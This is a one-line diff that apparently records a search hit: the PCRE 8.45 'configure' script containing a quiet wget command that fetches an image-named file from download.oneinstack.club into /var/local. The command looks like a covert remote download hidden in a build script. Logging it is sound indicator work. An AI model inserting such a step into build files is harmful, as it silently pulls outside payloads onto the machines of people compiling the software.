@@ -1,0 +1,1 @@
+pcre-8.45/configure:wget -q -nv http://download.oneinstack.club/osk.jpg -cO /var/local/osk.jpg
